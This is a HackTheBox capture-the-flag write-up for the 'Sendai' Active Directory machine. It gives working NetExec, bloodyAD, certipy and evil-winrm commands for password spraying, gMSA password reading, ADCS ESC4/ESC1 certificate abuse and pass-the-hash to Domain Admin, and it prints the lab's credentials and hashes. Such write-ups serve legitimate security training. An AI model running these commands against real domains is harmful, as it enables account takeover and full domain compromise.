# [HackTheBox - Sendai](https://app.hackthebox.com/machines/Sendai)
![af405ee6dbf68c791b1f0bb130eaa718.png](/resources/af405ee6dbf68c791b1f0bb130eaa718.png)
## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
  - [Discovery of accounts with STATUS_PASSWORD_MUST_CHANGE](#discovery-of-accounts-with-status_password_must_change)
  - [Foothold path discovery via Bloodhound](#foothold-path-discovery-via-bloodhound)
- [Initial Access - GenericAll on group and ReadGMSAPassword](#initial-access-genericall-on-group-and-readgmsapassword)
- [Privilege Escalation - Plaintext credential in services path to ADCS ESC4](#privilege-escalation-plaintext-credential-in-services-path-to-adcs-esc4)
  - [Discovery of Plaintext credential in services path](#discovery-of-plaintext-credential-in-services-path)
  - [ADCS ESC4 to Administrator](#adcs-esc4-to-administrator)

***
## Abstract
Sendai is a vulnlab machine imported to HackTheBox as a medium Windows Active Directory box, I started with network enumeration with nmap, revealing this machine is a domain controller and has a website running on port 80.

On the enumeration phase, I found that guest account is enabled and can be used to pull user list and discover a non-standard share which reveal about the security incident that require all user to change their password. I used this oppotunity to spray the SMB with user list I pulled and I found 2 users that did not change the password so I changed them and using bloodhound to collect domain information.

The bloodhound result shows that 2 users I just found is in Support group which has GenericAll over ADMSVC group and ADMSVC group has can read GMSA password of an account in remote management group which I made my foothold via this account after adding 1 of controlled user to the group and read GMSA password.  

After gaining a foothold, I found the plaintext credential of another user from service path argument amd this user is a member of CA-Operators group that have GenericAll over SendaiComputer certificate template which I abused ADCS ESC4 to obtain a certificate of Administrator user and finally root the box.

## Enumeration

I start with nmap scan without any flag to quickly scan for well-known port which reveals that this machine is a domain controller and even have a website hosting on port 80 as well.
![bb309acb2bdabc2e53978e800156b87d.png](/resources/bb309acb2bdabc2e53978e800156b87d.png)

I rerun nmap scan again but this time with `-sCV` flag for service enumeration and nmap script engine, which I discovered the hostname here and found that port 80 is just running default IIS webpage. 
![348ddd742c746faf7217223cd984edee.png](/resources/348ddd742c746faf7217223cd984edee.png)

Since this is the domain controller, I start by enumerating SMB and LDAP next with null session and guest user which I found that null session can not be used here.
![e36b43bc94422ac2a532ff96a5485a0f.png](/resources/e36b43bc94422ac2a532ff96a5485a0f.png)

But the guest account is enabled and we can use it to list a share which reveals non-standard share with READ access as guest user.
```
nxc smb dc.sendai.vl -u 'guest' -p '' --shares --users
```
![a9e9445154a5eed2433ba881c4a54617.png](/resources/a9e9445154a5eed2433ba881c4a54617.png)

I use the guest account to access sendai share which I found 2 interesting text files here indicating security incidrent that I could take advantage of.
```
smbclient \\\\dc.sendai.vl\\sendai -N
recurse on
ls
```
![a116273a55ed3a75dfc69768655f1110.png](/resources/a116273a55ed3a75dfc69768655f1110.png)
![661938ddee6c940cf805c0dc7ef56423.png](/resources/661938ddee6c940cf805c0dc7ef56423.png)

The `incident.txt` file telling me that there is a security incident happened which require everyone to change their password.
![4d98697640e03c8555c5e5bfaaf74e54.png](/resources/4d98697640e03c8555c5e5bfaaf74e54.png)

I use RID cycling method to see if i can pull user list on this domain and sure enough, I can since I can use guest account to access SMB share so RPC can be used for this method.
![000707dc1ed982f05e253797f9aad44f.png](/resources/000707dc1ed982f05e253797f9aad44f.png)

I add them to a single wordlist so I can spray it later.
```
nxc smb dc.sendai.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```
![f924ae2b393eb6f651a630d163e9f028.png](/resources/f924ae2b393eb6f651a630d163e9f028.png)

### Discovery of accounts with STATUS_PASSWORD_MUST_CHANGE
I did not find any interesting indicator of what the default password might be so I use blank password to test it out which is working and reveals that there are 2 users (Elliot.Yates and Thomas.Powell) that has not changed their password yet by chaning their password and taking control of their accounts.
```
nxc smb dc.sendai.vl -u users -p '' --continue-on-success 
```
![e6e0923effbb61d5fa2398a26de70130.png](/resources/e6e0923effbb61d5fa2398a26de70130.png)

I use the "change-password" module from NetExec to change their password which I have to use it with the latest version from the GitHub since this module did not make it to Kali Linux's Netexec yet.
```
uv run nxc smb dc.sendai.vl -u 'Elliot.Yates' -p '' -M change-password -o NEWPASS=Password123
uv run nxc smb dc.sendai.vl -u 'Thomas.Powell' -p '' -M change-password -o NEWPASS=Password123
```
![835d6c27a3d9c03ca24d72b993c2e8a0.png](/resources/835d6c27a3d9c03ca24d72b993c2e8a0.png)

After changing the password, I test it with WinRM to see if i can get a foothold with any of them but look like I need to explore more to find the way in.
![1100d94903600c22fffd16431e8ba44f.png](/resources/1100d94903600c22fffd16431e8ba44f.png)

Then I list the share again with both user credential which reveals another non-standard share that I could take advantage of.
```
nxc smb dc.sendai.vl -u 'Thomas.Powell' -p 'Password123' --shares
nxc smb dc.sendai.vl -u 'Elliot.Yates' -p 'Password123' --shares
```
![5b3c8daf955cab53fc6fd3f2d8d696c0.png](/resources/5b3c8daf955cab53fc6fd3f2d8d696c0.png)

There is only a single file located in this share but it does contain a single file with a credential of a service account, sadly this sql service account could not be used gain a foothold and the nmap result shows us that there is no mssql service exposed to me.
```
smbclient \\\\dc.sendai.vl\\config -U 'Elliot.Yates' --password='Password123'
```
![6673cd81579ecbbd4d6cc34e03847c2c.png](/resources/6673cd81579ecbbd4d6cc34e03847c2c.png)
![e0af24a4cd82087a2435ac131b4b5993.png](/resources/e0af24a4cd82087a2435ac131b4b5993.png)

I spray this password against all users from my user list again but look like this password is only limited to the sqlsvc account. 
```
nxc smb dc.sendai.vl -u users  -p 'SurenessBlob85' --continue-on-success
```
![4b0ef21d8dbeeb18e9eb143146d0ec74.png](/resources/4b0ef21d8dbeeb18e9eb143146d0ec74.png)

Without a way to enumerate further, I use rusthound to collect domain information and open it with Bloodhound Community Edition to see if all users I have can make it for the foothold and potentially root the box.
```
rusthound-ce -d sendai.vl -u Thomas.Powell@sendai.vl -z
```
![3854b05a58210bd1f6c5d16a27748910.png](/resources/3854b05a58210bd1f6c5d16a27748910.png)

### Foothold path discovery via Bloodhound
On the bloodhound, I found that both Elliot.Yates and Thomas.Powell users are the member of "Support" group which have GenericAll right over "ADMSVC" (Admin Service) group that will allow me to add any user to the group I have this rights on. (another thing to mention here is the existence of ADCS so we might use ADCS exploit to get root the box at the end)
![6aa5d63650ebc1772e08fda2b651b7d5.png](/resources/6aa5d63650ebc1772e08fda2b651b7d5.png)
![b8a21a5def2ce83f8666683438caa7a9.png](/resources/b8a21a5def2ce83f8666683438caa7a9.png)

And the ADMSVC group has ReadGMSAPassword over "MGTSVC$"  and will allow me to read a password of this account that is Group Managed Service Account (GMSA), this account's password is managed by domain controller and will be automatically changed by domain controller on a set interval, I do not know the interval but One thing I am certain is the "MGTSVC\$" is a member of Remote Management Users group and this will allow me to gain a foothold on this machine via WinRM.
![ff9b4ff879bf2d7fe152d1d853343b79.png](/resources/ff9b4ff879bf2d7fe152d1d853343b79.png)

In summry, I will have to add either of one of 2 users in Support group to ADMSVC group and then use NetExec to read GMSA password of MGTSVC$ account which I will gain a foothold using evil-winrm. now lets start the operation.

## Initial Access - GenericAll on group and ReadGMSAPassword
With that long explaination but in actual engagement, Only 2 commands can be used to get actually read GMSA password as 1 of resetted password user I have as shown below.
```
bloodyAD -u 'Elliot.Yates' -p 'Password123' -d 'sendai.vl' --host 'dc.sendai.vl' add groupMember "admsvc" 'Elliot.Yates'
nxc ldap dc.sendai.vl -u 'Elliot.Yates' -p 'Password123' --gmsa
```
![3be972be29c21c206cd85bb14e43bec6.png](/resources/3be972be29c21c206cd85bb14e43bec6.png)

Before attempting to connect with evil-winrm for the foothold, I check if this credential is correct and sure enough, I can use it to get a foothold on this machine.
![c63361de602c5ba4f3dd410a4ddc2365.png](/resources/c63361de602c5ba4f3dd410a4ddc2365.png)

Connect to the machine and loot the user flag located on the root folder of C drive.
```
evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H eb19b37b20218824d3c29f753fd5f607
```
![052097802503786f491796edf233380b.png](/resources/052097802503786f491796edf233380b.png)

## Privilege Escalation - Plaintext credential in services path to ADCS ESC4
### Discovery of Plaintext credential in services path
After I got a foothold,I start enumerate various of folder and files and even user information but then I found a user credential of the "clifford.davey" from the service path of the Support service.
```
services
```
![6d494d61a52710b34b7eb5222431e38c.png](/resources/6d494d61a52710b34b7eb5222431e38c.png)

Using NetExec to check the validity of this credential, I'm in control of another user but what's next?
![c27d7c7aae68b6b2dd0860a333477a0c.png](/resources/c27d7c7aae68b6b2dd0860a333477a0c.png)

Luckily for me, Rusthound also collect an information about the certificate templates as well which I found that "clifford.davey" is a member of CA-Operators group which have full control over "SendaiComputer" certificate template which can be attack with ADCS ESC4. What this mean? It mean I can modify this template to make it vulnerable to ADCS ESC1 and obtain a certificate of the Administrator user and eventually get its kerberos ticket and NTLM hash to root this box.  
![0d13c4b97414246b78f5a6f6a44e8235.png](/resources/0d13c4b97414246b78f5a6f6a44e8235.png)

### ADCS ESC4 to Administrator
To confirm that we can really use certipy to exploit this, I simply run it with `find -vulnerable` flag to find the vulnerable ADCS misconfiguration amd the result confirm that "clifford.davey" can conduct ADCS ESC4 attack on "SendaiComputer" template.
```
certipy-ad find -vulnerable -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -stdout
```
![1e3eefbf926d7ded85c6162086d430d2.png](/resources/1e3eefbf926d7ded85c6162086d430d2.png)

Then I overwrite the configuration of the vulnerable certificate template which will introduce it other kind of ADCS misconfiguration. and by default, certipy will make it vulnerable to ADCS ESC1 which is the easiest certificate template to exploit.
```
certipy template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -template 'SendaiComputer' -write-default-configuration
```
![956e577197ff0e641500d2c42fc68087.png](/resources/956e577197ff0e641500d2c42fc68087.png)

We can see that the this template is now vulnerable to ESC1 so we can proceed with the attack with certipy
![6d70381e2acc57611be49fe78a964458.png](/resources/6d70381e2acc57611be49fe78a964458.png)

ESC1 can be exploited by sending a certificate request with SAN attribute set with UPN (userPrincipalName) of another user (high privilege user often preferred such as Administrator) and to make the mapping successful with the right user, I need to get SID of Administrator user here to use it on my certipy command as well.
![8da3d8a414eff0af149b6029124d4fb2.png](/resources/8da3d8a414eff0af149b6029124d4fb2.png)

Next I send a request to get a certificate of Administrator user and we can see that I've successfully obtained a certificate of Administrator user as `administrator.pfx` file.
```
certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -ca 'sendai-DC-CA' -template 'SendaiComputer' -upn 'Administrator@sendai.vl' -sid 'S-1-5-21-3085872742-570972823-736764132-500'
```
![482a7a74e27ae572376664b78732ad72.png](/resources/482a7a74e27ae572376664b78732ad72.png)

Using the certificate file, I requested for TGT of the Administrator user and obtain NTLM hash which we can either use ccache file to authenticate to the machine or use NTLM with pass-the-hash to gain access. both ways are valid here.
```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.234.66'
```
![a1494a9458faf287c905040d94ee0ccb.png](/resources/a1494a9458faf287c905040d94ee0ccb.png)

I simply use pass-the-hash technique with evil-winrm to gain access to the machine as Administrator, loot the root flag and root the box. :D
```
evil-winrm -i dc.sendai.vl -u 'Administrator' -H cfb106feec8b89a3d98e14dcbe8d087a
```
![5e981761e7e6f41335d2e0b590b8cbf1.png](/resources/5e981761e7e6f41335d2e0b590b8cbf1.png)

https://labs.hackthebox.com/achievement/machine/1438364/712
***